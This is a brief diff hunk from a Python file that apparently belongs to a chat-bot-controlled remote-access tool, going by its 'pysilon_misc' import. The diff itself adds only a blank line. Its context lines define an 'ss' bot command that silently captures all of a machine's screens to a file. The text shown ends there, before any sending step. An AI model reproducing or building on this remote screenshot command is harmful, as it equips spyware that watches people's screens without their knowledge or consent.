@@ -5,6 +5,7 @@ from PIL import ImageGrab
 import resources.modules.misc as pysilon_misc
 #</imports>
 
+
 @client.command(name="ss")
 async def screenshot(ctx):
     ImageGrab.grab(all_screens=True).save('ss.png')
